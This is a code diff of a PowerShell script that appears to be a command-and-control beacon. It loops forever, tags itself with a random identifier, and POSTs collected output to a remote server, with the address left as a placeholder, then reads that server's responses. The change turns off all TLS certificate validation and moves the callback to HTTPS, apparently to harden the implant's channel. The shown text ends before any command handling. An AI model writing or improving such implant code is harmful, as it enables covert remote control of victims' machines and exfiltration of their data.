@@ -1,3 +1,4 @@
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 $servers = @("x.x.x.x:x")
 $iden = -join ((65..90) + (97..122) | Get-Random -Count 4 | % {[char]$_})
 $output = ""
@@ -5,7 +6,7 @@ while ($true) {
     try {
         $server = $servers[(Get-Random -Maximum ([array]$servers).count)]
         $body = "${iden}:${output}"
-        $response = Invoke-WebRequest -Body $body -Method "POST" -Uri "http://${server}"
+        $response = Invoke-WebRequest -Body $body -Method "POST" -Uri "https://${server}"
         $output = ""
         if ($response.StatusCode -eq 200) {
             if ($response.Content -ne "") {
